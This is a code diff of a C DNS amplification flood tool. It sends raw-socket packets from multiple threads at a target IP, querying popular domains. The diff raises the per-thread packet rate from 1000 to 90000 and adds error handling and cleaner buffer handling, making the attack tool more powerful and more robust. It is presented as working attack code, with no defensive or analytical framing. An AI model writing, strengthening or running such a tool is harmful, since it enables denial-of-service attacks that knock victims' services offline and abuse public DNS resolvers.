@@ -1,3 +1,4 @@
+```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -18,7 +19,7 @@
 #define DNS_QUERY_SIZE 128
 #define MAX_DNS_SERVERS 100
 #define MAX_DOMAINS 5
-#define PACKETS_PER_SECOND 1000 // Rate limit per thread
+#define PACKETS_PER_SECOND 90000 // Rate limit per thread
 
 typedef struct {
     int thread_id;
@@ -203,15 +204,20 @@ void generate_random_ip(char *ip) {
 
 void select_random_domain(char *qname, size_t qname_size) {
     const char *domains[] = {
-        "\x06google\x03com\x00",
-        "\x07youtube\x03com\x00",
-        "\x08facebook\x03com\x00",
-        "\x06amazon\x03com\x00",
-        "\x07twitter\x03com\x00"
+        "\x06google\x03com\x00",  // google.com
+        "\x07youtube\x03com\x00", // youtube.com
+        "\x08facebook\x03com\x00", // facebook.com
+        "\x06amazon\x03com\x00",  // amazon.com
+        "\x07twitter\x03com\x00"  // twitter.com
     };
     int index = rand() % MAX_DOMAINS;
-    strncpy(qname, domains[index], qname_size - 1);
-    qname[qname_size - 1] = '\0';
+    size_t len = strlen(domains[index]) + 1;
+    if (len > qname_size) {
+        fprintf(stderr, "Error: Domain name too long for buffer\n");
+        len = qname_size - 1;
+    }
+    strncpy(qname, domains[index], len);
+    qname[len] = '\0';
 }
 
 void *dns_amplification_thread(void *arg) {
@@ -219,13 +225,13 @@ void *dns_amplification_thread(void *arg) {
     
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (sock < 0) {
-        perror("Raw socket creation failed");
+        fprintf(stderr, "Thread %d: Raw socket creation failed: %s\n", data->thread_id, strerror(errno));
         return NULL;
     }
     
     int one = 1;
     if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
-        perror("setsockopt failed");
+        fprintf(stderr, "Thread %d: setsockopt failed: %s\n", data->thread_id, strerror(errno));
         close(sock);
         return NULL;
     }
@@ -305,6 +311,8 @@ void *dns_amplification_thread(void *arg) {
         if (sendto(sock, packet, ip->tot_len, 0, 
                   (struct sockaddr *)&sin, sizeof(sin)) > 0) {
             atomic_fetch_add(data->packet_count, 1);
+        } else {
+            fprintf(stderr, "Thread %d: sendto failed: %s\n", data->thread_id, strerror(errno));
         }
         
         nanosleep(&sleep_time, NULL);
@@ -372,7 +380,10 @@ int main(int argc, char *argv[]) {
         thread_data[i].target_ip[sizeof(thread_data[i].target_ip) - 1] = '\0';
         
         if (pthread_create(&threads[i], NULL, dns_amplification_thread, (void*)&thread_data[i]) != 0) {
-            perror("Thread creation failed");
+            fprintf(stderr, "Thread %d creation failed: %s\n", i, strerror(errno));
+            for (int j = 0; j < i; j++) {
+                pthread_cancel(threads[j]);
+            }
             free(threads);
             free(thread_data);
             free(packet_counts);
@@ -416,3 +427,4 @@ int main(int argc, char *argv[]) {
     
     return EXIT_SUCCESS;
 }
+```
